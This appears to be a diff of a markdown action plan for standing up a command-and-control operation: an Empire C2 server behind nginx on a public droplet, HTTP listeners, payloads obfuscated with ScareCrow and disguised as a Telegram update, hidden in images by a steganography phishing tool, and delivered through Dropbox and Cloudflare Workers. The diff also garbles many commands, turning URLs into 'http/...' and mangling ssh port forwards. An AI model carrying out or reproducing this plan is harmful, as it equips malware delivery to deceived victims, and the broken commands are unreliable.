@@ -1,8 +1,8 @@
 # C2 Framework - Current Status & Action Items
 
-## 📊 CURRENT SITUATION
+## CURRENT SITUATION
 
-### ✅ What's Working
+### What's Working
 - Local Kali machine configured
 - Digital Ocean droplet accessible: `161.35.155.3`
 - nginx proxy configured on droplet
@@ -13,14 +13,14 @@
 - Cloudflare Workers code written
 - Empire launcher GUI functional
 
-### ⚠️ Current Issues
+### ️ Current Issues
 - Empire installation has Python 2/3 compatibility issues
 - Dependencies need to be properly resolved
 - Listeners not yet configured
 - Stagers not yet generated
 - nginx not yet configured for Empire/Starkiller
 
-## 🎯 IMMEDIATE ACTIONS REQUIRED
+## IMMEDIATE ACTIONS REQUIRED
 
 ### Priority 1: Fix Empire Installation (30 mins)
 
@@ -33,16 +33,16 @@ docker pull bcsecurity/empire:latest
 
 # Run Empire server
 docker run -d --name empire \\
-  -p 1337:1337 \\
-  -p 5000:5000 \\
-  -v /home/kali/Main\ C2\ Framework/empire-data:/root/.local/share/powershell-empire \\
-  bcsecurity/empire:latest
+ -p 1337:1337 \\
+ -p 5000:5000 \\
+ -v /home/kali/Main\ C2\ Framework/empire-dataroot/.local/share/powershell-empire \\
+ bcsecurity/empire:latest
 
 # Access Empire CLI
 docker exec -it empire powershell-empire client
 
 # Check API
-curl http://127.0.0.1:1337/api/v2/meta/version
+curl http/127.0.0.1:1337/api/v2/meta/version
 ```
 
 #### Option B: Install via pip (CLEAN INSTALL)
@@ -69,66 +69,66 @@ ssh root@161.35.155.3
 # Create Empire nginx config
 cat > /etc/nginx/sites-available/empire << 'EOF'
 upstream empire_api {
-    server 127.0.0.1:1337;
+ server 127.0.0.1:1337;
 }
 
 upstream starkiller {
-    server 127.0.0.1:5000;
+ server 127.0.0.1:5000;
 }
 
 server {
-    listen 443 ssl http2;
-    server_name 161-35-155-3.sslip.io;
-    
-    # SSL configuration (if certificates exist)
-    ssl_certificate /etc/ssl/certs/empire.crt;
-    ssl_certificate_key /etc/ssl/private/empire.key;
-    
-    # Or use self-signed for testing
-    # ssl_certificate /etc/nginx/ssl/nginx.crt;
-    # ssl_certificate_key /etc/nginx/ssl/nginx.key;
-    
-    # Starkiller UI
-    location / {
-        proxy_pass http://starkiller;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection 'upgrade';
-        proxy_set_header Host $host;
-        proxy_cache_bypass $http_upgrade;
-    }
-    
-    # Empire API
-    location /api {
-        proxy_pass http://empire_api;
-        proxy_http_version 1.1;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header Host $host;
-    }
-    
-    # WebSocket support
-    location /socket.io {
-        proxy_pass http://empire_api;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection "upgrade";
-    }
+ listen 443 ssl http2;
+ server_name 161-35-155-3.sslip.io;
+
+ # SSL configuration (if certificates exist)
+ ssl_certificate /etc/ssl/certs/empire.crt;
+ ssl_certificate_key /etc/ssl/private/empire.key;
+
+ # Or use self-signed for testing
+ # ssl_certificate /etc/nginx/ssl/nginx.crt;
+ # ssl_certificate_key /etc/nginx/ssl/nginx.key;
+
+ # Starkiller UI
+ location / {
+ proxy_pass http/starkiller;
+ proxy_http_version 1.1;
+ proxy_set_header Upgrade $http_upgrade;
+ proxy_set_header Connection 'upgrade';
+ proxy_set_header Host $host;
+ proxy_cache_bypass $http_upgrade;
+ }
+
+ # Empire API
+ location /api {
+ proxy_pass http/empire_api;
+ proxy_http_version 1.1;
+ proxy_set_header X-Real-IP $remote_addr;
+ proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+ proxy_set_header Host $host;
+ }
+
+ # WebSocket support
+ location /socket.io {
+ proxy_pass http/empire_api;
+ proxy_http_version 1.1;
+ proxy_set_header Upgrade $http_upgrade;
+ proxy_set_header Connection "upgrade";
+ }
 }
 
 server {
-    listen 80;
-    server_name 161-35-155-3.sslip.io;
-    return 301 https://$server_name$request_uri;
+ listen 80;
+ server_name 161-35-155-3.sslip.io;
+ return 301 https/$server_name$request_uri;
 }
 EOF
 
 # Generate self-signed cert for testing
 sudo mkdir -p /etc/nginx/ssl
 sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\
-    -keyout /etc/nginx/ssl/nginx.key \\
-    -out /etc/nginx/ssl/nginx.crt \\
-    -subj "/C=DK/ST=Copenhagen/L=Copenhagen/O=Research/CN=161-35-155-3.sslip.io"
+ -keyout /etc/nginx/ssl/nginx.key \\
+ -out /etc/nginx/ssl/nginx.crt \\
+ -subj "/CK/ST=Copenhagen/L=Copenhagen/O=Research/CN=161-35-155-3.sslip.io"
 
 # Enable site
 sudo ln -s /etc/nginx/sites-available/empire /etc/nginx/sites-enabled/
@@ -142,13 +142,13 @@ From your Kali machine, forward Empire to the droplet:
 
 ```bash
 # Terminal 1: Forward Empire API
-ssh -R 1337:localhost:1337 -N root@161.35.155.3
+ssh -R 13371337 -N root@161.35.155.3
 
 # Terminal 2: Forward Starkiller UI
-ssh -R 5000:localhost:5000 -N root@161.35.155.3
+ssh -R 50005000 -N root@161.35.155.3
 
 # Or combined
-ssh -R 1337:localhost:1337 -R 5000:localhost:5000 root@161.35.155.3
+ssh -R 13371337 -R 50005000 root@161.35.155.3
 ```
 
 ### Priority 4: Create Listeners (10 mins)
@@ -165,7 +165,7 @@ powershell-empire client
 # Create HTTP listener
 uselistener http
 set Name main_http
-set Host https://161-35-155-3.sslip.io
+set Host https/161-35-155-3.sslip.io
 set Port 443
 set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 execute
@@ -193,36 +193,36 @@ execute
 ls /opt/stagers/
 ```
 
-## 📋 COMPLETE WORKFLOW
+## COMPLETE WORKFLOW
 
 Once the above is complete:
 
 ### 1. Test Empire Connectivity
 ```bash
 # From Kali (local)
-curl http://127.0.0.1:1337/api/v2/meta/version
+curl http/127.0.0.1:1337/api/v2/meta/version
 
 # From internet (via droplet)
-curl https://161-35-155-3.sslip.io/api/v2/meta/version
+curl https/161-35-155-3.sslip.io/api/v2/meta/version
 ```
 
 ### 2. Generate Obfuscated Payloads
 ```bash
 cd /home/kali/ScareCrow
 ./ScareCrow \\
-  -I /opt/stagers/empire.dll \\
-  -Loader binary \\
-  -domain microsoft.com \\
-  -O /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe
+ -I /opt/stagers/empire.dll \\
+ -Loader binary \\
+ -domain microsoft.com \\
+ -O /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe
 ```
 
 ### 3. Embed in Steganography System
 ```bash
 cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing
 python3 large-stego-system.py embed \\
-  --payload /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe \\
-  --carrier-image ./images/telegram-hero.png \\
-  --output ./output/telegram-hero-payload.png
+ --payload /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe \\
+ --carrier-image ./images/telegram-hero.png \\
+ --output ./output/telegram-hero-payload.png
 ```
 
 ### 4. Upload to Dropbox
@@ -249,7 +249,7 @@ wrangler publish enhanced-telegram-delivery.js
 # 7. Agent checks in to C2
 ```
 
-## 🔍 VERIFICATION CHECKLIST
+## VERIFICATION CHECKLIST
 
 - [ ] Empire server responds to API calls
 - [ ] Starkiller UI loads in browser
@@ -276,7 +276,7 @@ wrangler publish enhanced-telegram-delivery.js
 
 **TOTAL: ~2 hours to fully operational**
 
-## 🛠️ QUICK START COMMAND
+## ️ QUICK START COMMAND
 
 ```bash
 # Run this to get Empire up quickly
@@ -288,12 +288,12 @@ docker run -d --name empire -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest
 sleep 30
 
 # Test
-curl http://127.0.0.1:1337/api/v2/meta/version
+curl http/127.0.0.1:1337/api/v2/meta/version
 
 # If working, proceed with nginx setup on droplet
 ```
 
-## 📝 NOTES
+## NOTES
 
 - Empire Docker image is the fastest path to working C2
 - nginx configuration can be tested with self-signed certs
@@ -302,7 +302,7 @@ curl http://127.0.0.1:1337/api/v2/meta/version
 - All components are ready except Empire server itself
 - Once Empire is running, everything else falls into place
 
-## 🚨 CRITICAL PATH
+## CRITICAL PATH
 
 1. Get Empire running (Docker recommended)
 2. Configure nginx on droplet
